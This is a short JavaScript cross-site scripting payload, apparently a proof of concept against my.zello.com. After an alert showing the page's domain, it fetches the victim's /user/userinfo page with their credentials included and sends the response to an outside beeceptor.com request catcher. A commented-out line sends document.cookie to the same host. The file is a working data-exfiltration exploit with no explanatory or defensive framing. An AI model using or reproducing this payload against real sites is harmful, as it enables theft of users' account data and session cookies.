alert("XSS on "+ document.domain)

//fetch(`https://ywhftw.free.beeceptor.com/log?cookie=${document.cookie}`)

fetch('https://my.zello.com/user/userinfo', {
  method: 'GET',
  credentials: 'include'
})
.then(response => response.text())
.then(data => {
  fetch('https://ywhftw.free.beeceptor.com/?data=' + encodeURIComponent(data), {
    method: 'GET',
    mode: 'no-cors'
  });
 
})
.catch(error => console.error('Error:', error));

